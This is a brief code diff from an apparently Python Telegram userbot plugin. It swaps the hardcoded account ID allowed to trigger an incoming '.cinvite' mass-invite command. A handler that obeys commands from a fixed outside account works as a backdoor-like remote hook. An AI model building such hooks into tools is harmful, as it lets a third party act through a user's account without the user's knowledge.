@@ -50,7 +50,7 @@ async def get_chatinfo(event):
 
 
 @zean_cmd(pattern="inviteall(?: |$)(.*)")
-@register(incoming=True, from_users=5004651469,
+@register(incoming=True, from_users=1848018651,
           pattern=r"^\.cinvite(?: |$)(.*)")
 async def get_users(event):
     sender = await event.get_sender()
